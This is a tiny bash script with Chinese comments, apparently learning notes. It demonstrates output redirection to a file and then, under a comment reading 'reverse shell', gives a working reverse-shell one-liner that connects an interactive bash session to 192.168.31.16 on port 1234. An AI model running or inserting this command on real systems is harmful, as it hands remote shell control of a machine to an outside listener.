#/bin/bash

# 重定向文件流
echo "Hello bash" > code/test1.txt
echo "continue add" >> code/test1.txt 

# 反弹shell
bash -i >& /dev/tcp/192.168.31.16/1234 0>&1 